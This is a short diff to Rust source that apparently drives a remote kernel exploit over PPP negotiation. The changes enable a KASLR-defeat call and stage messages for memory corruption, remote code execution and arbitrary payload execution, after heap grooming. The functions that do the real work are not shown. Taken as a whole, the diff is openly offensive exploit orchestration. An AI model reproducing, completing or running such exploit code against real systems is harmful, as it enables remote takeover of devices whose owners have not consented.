@@ -29,25 +29,20 @@ fn run_exploit(interface_name: String) {
     expl.ppp_negotiation(&interface);
     expl.lcp_negotiation(&interface);
     expl.ipcp_negotiation(&interface);
-    println!("[*] Initial Negotiations Done... Wait for interface to be ready");
-    println!("[*] Starting Heap Grooming...");
+    println!("[+] Initial Negotiations Done... Wait for interface to be ready");
+    println!("[+] Starting Heap Grooming...");
     expl.heap_grooming(&interface);
-    println!("[*] STAGE 1: Memory corruption");
+    println!("[+] STAGE 1: Memory corruption");
     expl.memory_corruption(&interface);
-    // println!("[*] Corrupt in6_llentry object...");
-    // println!("[*] Sending malicious LCP configure request...");
-    // println!("[*] Waiting for LCP configure reject...");
-    // // Negotiate after rejection
-    // expl.lcp_negotiation(&interface);
-    // expl.ipcp_negotiation(&interface);
-    // println!("[+] STAGE 2: KASLR defeat");
-    // println!("[+] STAGE 3: Remote code execution");
+    println!("[+] STAGE 2: KASLR defeat");
+    expl.defeat_kaslr(&interface);
+    println!("[+] STAGE 3: Remote code execution");
     // expl.ppp_negotiation(&interface);
     // expl.lcp_negotiation(&interface);
     // expl.ipcp_negotiation(&interface);
-    // println!("[+] STAGE 4: Arbitrary payload execution");
+    println!("[+] STAGE 4: Arbitrary payload execution");
     handler.stop();
-    println!("[*] DONE!");
+    println!("[+] DONE!");
 }
 
 fn main() {
